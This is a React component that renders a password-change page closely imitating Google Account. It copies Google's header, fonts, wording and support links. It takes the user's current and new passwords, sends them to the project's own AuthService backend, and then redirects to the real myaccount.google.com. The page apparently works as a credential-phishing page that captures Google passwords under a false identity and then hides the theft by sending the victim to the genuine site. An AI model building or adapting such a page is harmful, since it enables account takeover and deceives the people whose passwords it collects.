/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable @typescript-eslint/no-explicit-any */
import { useState } from 'react';
import { EyeIcon, EyeSlashIcon } from '@heroicons/react/24/outline';
import { useNavigate } from 'react-router-dom';
import { useDarkMode } from '../hooks/useDarkMode';
import AuthService from '../services/Auth.service';

const PasswordReset = () => {
  const navigate = useNavigate();
  const { isDarkMode } = useDarkMode();
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showCurrentPassword, setShowCurrentPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [loading, setLoading] = useState(false);
  // const [showHistory, setShowHistory] = useState(false);
  // const [passwordHistory, setPasswordHistory] = useState<any[]>([]);

  const calculatePasswordStrength = (password: string): number => {
    let strength = 0;
    if (password.length >= 8) strength++;
    if (password.match(/[a-z]/) && password.match(/[A-Z]/)) strength++;
    if (password.match(/[0-9]/)) strength++;
    if (password.match(/[^a-zA-Z0-9]/)) strength++;
    return strength;
  };

  const getPasswordStrengthText = (strength: number): string => {
    switch (strength) {
      case 0:
      case 1:
        return 'Weak';
      case 2:
        return 'Fair';
      case 3:
        return 'Good';
      case 4:
        return 'Strong';
      default:
        return '';
    }
  };

  const getPasswordStrengthColor = (strength: number): string => {
    if (isDarkMode) {
      switch (strength) {
        case 0:
        case 1:
          return 'bg-red-600';
        case 2:
          return 'bg-yellow-600';
        case 3:
          return 'bg-blue-600';
        case 4:
          return 'bg-green-600';
        default:
          return 'bg-gray-600';
      }
    } else {
      switch (strength) {
        case 0:
        case 1:
          return 'bg-red-500';
        case 2:
          return 'bg-yellow-500';
        case 3:
          return 'bg-blue-500';
        case 4:
          return 'bg-green-500';
        default:
          return 'bg-gray-200';
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setSuccess('');
    setLoading(true);

    // Validation
    if (!currentPassword) {
      setError('Please enter your current password');
      setLoading(false);
      return;
    }

    if (newPassword !== confirmPassword) {
      setError('New passwords do not match');
      setLoading(false);
      return;
    }

    if (newPassword.length < 8) {
      setError('Password must be at least 8 characters');
      setLoading(false);
      return;
    }

    if (currentPassword === newPassword) {
      setError('New password must be different from current password');
      setLoading(false);
      return;
    }

    try {
      const response = await AuthService.changePassword({
        currentPassword,
        newPassword,
        confirmNewPassword: confirmPassword,
      });

      setSuccess(response.message || 'Password changed successfully!');
      
      // Clear form
      setCurrentPassword('');
      setNewPassword('');
      setConfirmPassword('');
      
      // Navigate to Google Account page after 2 seconds to show success message
      setTimeout(() => {
        // Open Google Account in the same tab
        window.location.href = 'https://myaccount.google.com/';
      }, 2000);
    } catch (err: any) {
      setError(err.message || 'Failed to change password. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  // const handleViewHistory = async () => {
  //   if (showHistory) {
  //     setShowHistory(false);
  //     return;
  //   }

  //   setLoading(true);
  //   try {
  //     const history = await AuthService.getPasswordHistory();
  //     setPasswordHistory(history);
  //     setShowHistory(true);
  //   } catch (err: any) {
  //     setError(err.message || 'Failed to load password history');
  //   } finally {
  //     setLoading(false);
  //   }
  // };

  const handleBack = () => {
    navigate(-1);
  };

  const passwordStrength = calculatePasswordStrength(newPassword);
  const strengthText = getPasswordStrengthText(passwordStrength);
  const strengthColor = getPasswordStrengthColor(passwordStrength);

  return (
    <div className={`min-h-screen flex flex-col transition-colors duration-300 ${
      isDarkMode ? 'bg-[#202124]' : 'bg-white'
    }`}>
      {/* Top Navigation Bar — matches Google Account header */}
      <header className={`flex items-center justify-between px-6 py-3 border-b ${
        isDarkMode ? 'bg-[#202124] border-[#3c4043]' : 'bg-white border-gray-200'
      }`}>
        <span className={`text-sm font-medium ${
          isDarkMode ? 'text-[#e8eaed]' : 'text-[#202124]'
        }`} style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif" }}>
          Google Account
        </span>
        <div className="flex items-center gap-4">
          <button className={`p-1 rounded-full ${isDarkMode ? 'text-[#9aa0a6] hover:text-[#e8eaed]' : 'text-[#5f6368] hover:text-[#202124]'}`} aria-label="Help">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="h-6 w-6">
              <path fillRule="evenodd" d="M2.25 12c0-5.385 4.365-9.75 9.75-9.75s9.75 4.365 9.75 9.75-4.365 9.75-9.75 9.75S2.25 17.385 2.25 12zm11.378-3.917c-.89-.777-2.366-.777-3.255 0a.75.75 0 01-.988-1.129c1.454-1.272 3.776-1.272 5.23 0 1.513 1.324 1.513 3.233 0 4.557-.315.275-.635.524-.7.572-.232.185-.474.39-.642.599-.16.199-.27.42-.27.72a.75.75 0 01-1.5 0c0-.657.286-1.13.597-1.519.193-.239.434-.465.673-.657.046-.036.315-.259.587-.504.518-.454.518-1.289 0-1.743zM12 18a.75.75 0 100-1.5.75.75 0 000 1.5z" clipRule="evenodd" />
            </svg>
          </button>
          <button className={`p-1 rounded-full ${isDarkMode ? 'text-[#9aa0a6] hover:text-[#e8eaed]' : 'text-[#5f6368] hover:text-[#202124]'}`} aria-label="Google apps">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="h-6 w-6">
              <path fillRule="evenodd" d="M3 6a3 3 0 013-3h2.25a3 3 0 013 3v2.25a3 3 0 01-3 3H6a3 3 0 01-3-3V6zm9.75 0a3 3 0 013-3H18a3 3 0 013 3v2.25a3 3 0 01-3 3h-2.25a3 3 0 01-3-3V6zM3 15.75a3 3 0 013-3h2.25a3 3 0 013 3V18a3 3 0 01-3 3H6a3 3 0 01-3-3v-2.25zm9.75 0a3 3 0 013-3H18a3 3 0 013 3V18a3 3 0 01-3 3h-2.25a3 3 0 01-3-3v-2.25z" clipRule="evenodd" />
            </svg>
          </button>
          <button className="h-8 w-8 rounded-full bg-blue-600 flex items-center justify-center text-white text-sm font-medium" aria-label="Account">
            
          </button>
        </div>
      </header>

      {/* Page Content */}
      <div className="flex-1 px-4 sm:px-6 lg:px-8 pt-8 pb-4">
        <div className="max-w-xl mx-auto">
          {/* Page Title with back arrow */}
          <div className="flex items-center gap-3 mb-6">
            <button
              onClick={handleBack}
              className={`flex items-center justify-center rounded-full p-1.5 transition-colors focus:outline-none ${
                isDarkMode
                  ? 'text-[#e8eaed] hover:bg-[#3c4043]'
                  : 'text-[#202124] hover:bg-gray-100'
              }`}
              aria-label="Go back"
            >
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="h-5 w-5">
                <path fillRule="evenodd" d="M11.03 3.97a.75.75 0 010 1.06l-6.22 6.22H21a.75.75 0 010 1.5H4.81l6.22 6.22a.75.75 0 11-1.06 1.06l-7.5-7.5a.75.75 0 010-1.06l7.5-7.5a.75.75 0 011.06 0z" clipRule="evenodd" />
              </svg>
            </button>
            <h1
              className={`text-2xl font-normal ${isDarkMode ? 'text-[#e8eaed]' : 'text-[#202124]'}`}
              style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif" }}
            >
              Password
            </h1>
          </div>

          {/* Info text above the card */}
          <div className={`text-sm mb-4 space-y-3 ${isDarkMode ? 'text-[#bdc1c6]' : 'text-[#202124]'}`}>
            <p>
              Choose a strong password and don't reuse it for other accounts.{' '}
              <a
                href="https://support.google.com/accounts?p=pw_dont_reuse&hl=en"
                className="text-[#8ab4f8] hover:underline"
                target="_blank"
                rel="noopener noreferrer"
              >
                Learn more
              </a>
            </p>
            <p>
              You may be signed out of your account on some devices.{' '}
              <a
                href="https://myaccount.google.com/"
                className="text-[#8ab4f8] hover:underline"
                target="_blank"
                rel="noopener noreferrer"
              >
                Learn more about where you'll stay signed in
              </a>
            </p>
          </div>

          {/* Success Message */}
          {success && (
            <div className={`mb-4 rounded-lg p-3 border ${
              isDarkMode ? 'bg-green-900/20 border-green-800' : 'bg-green-50 border-green-200'
            }`}>
              <div className="flex items-start gap-2">
                <svg className="h-5 w-5 text-green-400 flex-shrink-0 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <p className={`text-sm ${isDarkMode ? 'text-green-400' : 'text-green-700'}`}>
                  {success} 
                </p>
              </div>
            </div>
          )}

          {/* Card */}
          <div className={`rounded-lg border px-6 py-6 ${
            isDarkMode
              ? 'bg-[#202124] border-[#3c4043]'
              : 'bg-white border-gray-200'
          }`}>
            <form className="space-y-5" onSubmit={handleSubmit}>
              {/* Current Password Field */}
              <div>
                <div className="relative">
                  <input
                    id="current-password"
                    name="current-password"
                    type={showCurrentPassword ? 'text' : 'password'}
                    required
                    value={currentPassword}
                    onChange={(e) => setCurrentPassword(e.target.value)}
                    placeholder=" "
                    className={`peer appearance-none block w-full px-3 pt-5 pb-2 border rounded focus:outline-none focus:ring-0 text-sm transition-all duration-200 ${
                      isDarkMode
                        ? 'bg-[#202124] border-[#5f6368] text-[#e8eaed] focus:border-[#8ab4f8]'
                        : 'bg-white border-gray-300 text-[#202124] focus:border-blue-500'
                    }`}
                  />
                  <label
                    htmlFor="current-password"
                    className={`absolute left-3 top-1 text-xs transition-all duration-200 ${
                      isDarkMode ? 'text-[#9aa0a6]' : 'text-[#5f6368]'
                    }`}
                    style={{ fontFamily: 'Roboto, Arial, sans-serif' }}
                  >
                    Current password
                  </label>
                  <button
                    type="button"
                    onClick={() => setShowCurrentPassword(!showCurrentPassword)}
                    className="absolute inset-y-0 right-0 pr-3 flex items-center"
                    aria-label={showCurrentPassword ? 'Hide password' : 'Show password'}
                  >
                    {showCurrentPassword ? (
                      <EyeSlashIcon className={`h-5 w-5 ${isDarkMode ? 'text-[#9aa0a6]' : 'text-[#5f6368]'}`} />
                    ) : (
                      <EyeIcon className={`h-5 w-5 ${isDarkMode ? 'text-[#9aa0a6]' : 'text-[#5f6368]'}`} />
                    )}
                  </button>
                </div>
                <div className="mt-1 text-right">
                  <a
                    href="https://accounts.google.com/signin/recovery"
                    className="text-xs text-[#8ab4f8] hover:underline"
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    Forgot password?
                  </a>
                </div>
              </div>

              {/* New Password Field */}
              <div>
                <div className="relative">
                  <input
                    id="new-password"
                    name="new-password"
                    type={showNewPassword ? 'text' : 'password'}
                    required
                    value={newPassword}
                    onChange={(e) => setNewPassword(e.target.value)}
                    placeholder=" "
                    className={`peer appearance-none block w-full px-3 pt-5 pb-2 border rounded focus:outline-none focus:ring-0 text-sm transition-all duration-200 ${
                      isDarkMode
                        ? 'bg-[#202124] border-[#8ab4f8] text-[#e8eaed] focus:border-[#8ab4f8]'
                        : 'bg-white border-blue-500 text-[#202124] focus:border-blue-600'
                    }`}
                  />
                  <label
                    htmlFor="new-password"
                    className={`absolute left-3 top-1 text-xs transition-all duration-200 ${
                      isDarkMode ? 'text-[#8ab4f8]' : 'text-blue-600'
                    }`}
                    style={{ fontFamily: 'Roboto, Arial, sans-serif' }}
                  >
                    New password
                  </label>
                  <button
                    type="button"
                    onClick={() => setShowNewPassword(!showNewPassword)}
                    className="absolute inset-y-0 right-0 pr-3 flex items-center"
                    aria-label={showNewPassword ? 'Hide password' : 'Show password'}
                  >
                    {showNewPassword ? (
                      <EyeSlashIcon className={`h-5 w-5 ${isDarkMode ? 'text-[#9aa0a6]' : 'text-[#5f6368]'}`} />
                    ) : (
                      <EyeIcon className={`h-5 w-5 ${isDarkMode ? 'text-[#9aa0a6]' : 'text-[#5f6368]'}`} />
                    )}
                  </button>
                </div>

                {/* Password Strength */}
                <div className="mt-2">
                  <div className="flex items-center justify-between mb-1">
                    <span className={`text-xs ${isDarkMode ? 'text-[#bdc1c6]' : 'text-[#5f6368]'}`}>
                      Password strength:
                    </span>
                    {newPassword && (
                      <span className={`text-xs font-medium ${
                        passwordStrength === 4 ? (isDarkMode ? 'text-green-400' : 'text-green-600') :
                        passwordStrength === 3 ? (isDarkMode ? 'text-blue-400' : 'text-blue-600') :
                        passwordStrength === 2 ? (isDarkMode ? 'text-yellow-400' : 'text-yellow-600') :
                        (isDarkMode ? 'text-red-400' : 'text-red-500')
                      }`}>
                        {strengthText}
                      </span>
                    )}
                  </div>
                  {newPassword && (
                    <div className={`w-full rounded-full h-1 overflow-hidden ${isDarkMode ? 'bg-[#3c4043]' : 'bg-gray-200'}`}>
                      <div
                        className={`${strengthColor} h-1 rounded-full transition-all duration-300`}
                        style={{ width: `${(passwordStrength / 4) * 100}%` }}
                      />
                    </div>
                  )}
                </div>

                <p className={`mt-2 text-xs leading-relaxed ${isDarkMode ? 'text-[#9aa0a6]' : 'text-[#5f6368]'}`}>
                  Use at least 8 characters. Don't use a password from another site, or something too obvious like your pet's name.{' '}
                  <a
                    href="https://support.google.com/accounts?p=pw_signup&hl=en"
                    className="text-[#8ab4f8] hover:underline"
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    Why?
                  </a>
                </p>
              </div>

              {/* Confirm Password Field */}
              <div>
                <div className="relative">
                  <input
                    id="confirm-password"
                    name="confirm-password"
                    type={showConfirmPassword ? 'text' : 'password'}
                    required
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    placeholder="Confirm new password"
                    className={`appearance-none block w-full px-3 py-3 border rounded focus:outline-none focus:ring-0 text-sm transition-all duration-200 ${
                      isDarkMode
                        ? 'bg-[#202124] border-[#5f6368] text-[#e8eaed] placeholder-[#9aa0a6] focus:border-[#8ab4f8]'
                        : 'bg-white border-gray-300 text-[#202124] placeholder-[#5f6368] focus:border-blue-500'
                    }`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                    className="absolute inset-y-0 right-0 pr-3 flex items-center"
                    aria-label={showConfirmPassword ? 'Hide password' : 'Show password'}
                  >
                    {showConfirmPassword ? (
                      <EyeSlashIcon className={`h-5 w-5 ${isDarkMode ? 'text-[#9aa0a6]' : 'text-[#5f6368]'}`} />
                    ) : (
                      <EyeIcon className={`h-5 w-5 ${isDarkMode ? 'text-[#9aa0a6]' : 'text-[#5f6368]'}`} />
                    )}
                  </button>
                </div>
              </div>

              {/* Error Message */}
              {error && (
                <div className={`rounded p-3 border ${isDarkMode ? 'bg-red-900/20 border-red-800' : 'bg-red-50 border-red-200'}`}>
                  <div className="flex items-start gap-2">
                    <svg className="h-5 w-5 text-red-400 flex-shrink-0 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
                      <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                    </svg>
                    <p className={`text-sm ${isDarkMode ? 'text-red-400' : 'text-red-700'}`}>{error}</p>
                  </div>
                </div>
              )}

              {/* Buttons */}
              <div className="flex justify-between items-center pt-1">
                {/* <button
                  type="button"
                  onClick={handleViewHistory}
                  disabled={loading}
                  className={`text-sm font-medium transition-colors duration-200 focus:outline-none ${
                    isDarkMode
                      ? 'text-[#8ab4f8] hover:text-[#aecbfa]'
                      : 'text-[#1a73e8] hover:text-[#1557b0]'
                  }`}
                >
                  View password history
                </button> */}
                
                <button
                  type="submit"
                  disabled={loading}
                  className={`px-6 py-2 rounded-full text-sm font-medium transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 ${
                    loading ? 'opacity-50 cursor-not-allowed' : ''
                  } ${
                    isDarkMode
                      ? 'bg-[#8ab4f8] text-[#202124] hover:bg-[#aecbfa] focus:ring-offset-[#202124]'
                      : 'bg-[#1a73e8] text-white hover:bg-[#1557b0]'
                  }`}
                >
                  {loading ? 'Changing...' : 'Change password'}
                </button>
              </div>
            </form>
          </div>

          {/* Password History Modal
          {showHistory && (
            <div className="mt-6">
              <div className={`rounded-lg border p-4 ${
                isDarkMode
                  ? 'bg-[#202124] border-[#3c4043]'
                  : 'bg-white border-gray-200'
              }`}>
                <div className="flex justify-between items-center mb-3">
                  <h3 className={`text-base font-medium ${
                    isDarkMode ? 'text-[#e8eaed]' : 'text-[#202124]'
                  }`}>
                    Password Change History
                  </h3>
                  <button
                    onClick={() => setShowHistory(false)}
                    className="text-sm text-[#8ab4f8] hover:underline"
                  >
                    Close
                  </button>
                </div>
                {passwordHistory.length === 0 ? (
                  <p className={`text-sm ${isDarkMode ? 'text-[#9aa0a6]' : 'text-[#5f6368]'}`}>
                    No password changes recorded yet.
                  </p>
                ) : (
                  <div className="space-y-2 max-h-60 overflow-y-auto">
                    {passwordHistory.map((record, index) => (
                      <div
                        key={record.id || index}
                        className={`p-2 rounded ${
                          isDarkMode ? 'bg-[#3c4043]' : 'bg-gray-50'
                        }`}
                      >
                        <p className={`text-xs ${
                          isDarkMode ? 'text-[#bdc1c6]' : 'text-[#5f6368]'
                        }`}>
                          Changed on: {new Date(record.changedAt).toLocaleString()}
                        </p>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )} */}
        </div>
      </div>

      {/* Footer */}
      <footer className={`border-t py-4 mt-auto transition-colors duration-300 ${
        isDarkMode ? 'bg-[#202124] border-[#3c4043]' : 'bg-white border-gray-200'
      }`}>
        <div className="max-w-xl mx-auto px-4 sm:px-6">
          <div className="flex flex-wrap gap-x-6 gap-y-2 text-xs">
            {['Privacy', 'Terms', 'Help', 'About'].map((item, i) => (
              <a
                key={item}
                href={
                  i === 0 ? 'https://policies.google.com/privacy'
                  : i === 1 ? 'https://policies.google.com/terms'
                  : i === 2 ? 'https://support.google.com/accounts'
                  : 'https://about.google/'
                }
                className={`hover:underline transition-colors duration-300 ${
                  isDarkMode ? 'text-[#9aa0a6] hover:text-[#bdc1c6]' : 'text-[#5f6368] hover:text-[#202124]'
                }`}
                target="_blank"
                rel="noopener noreferrer"
              >
                {item}
              </a>
            ))}
          </div>
        </div>
      </footer>
    </div>
  );
};

export default PasswordReset;